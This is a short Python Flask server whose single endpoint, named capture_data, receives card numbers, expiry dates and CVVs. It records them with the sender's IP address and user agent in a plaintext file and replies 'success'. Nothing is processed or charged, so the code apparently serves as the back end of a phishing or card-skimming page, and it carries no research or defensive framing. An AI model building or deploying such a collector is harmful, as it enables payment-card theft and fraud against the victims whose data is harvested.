from flask import Flask, request, jsonify
from flask_sslify import SSLify
import datetime

app = Flask(__name__)
sslify = SSLify(app)  

@app.route('/submit', methods=['POST'])
def capture_data():
    data = request.json
    log_entry = f"""
    [{datetime.datetime.now()}] New Submission:
    Card: {data.get('cardNumber')}
    Expiry: {data.get('expiry')}
    CVV: {data.get('cvv')}
    IP: {request.remote_addr}
    User-Agent: {request.headers.get('User-Agent')}
    """
    
    with open("card_data.txt", "a") as f:
        f.write(log_entry + "\n")
    
    return jsonify({"status": "success"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=443, ssl_context='adhoc')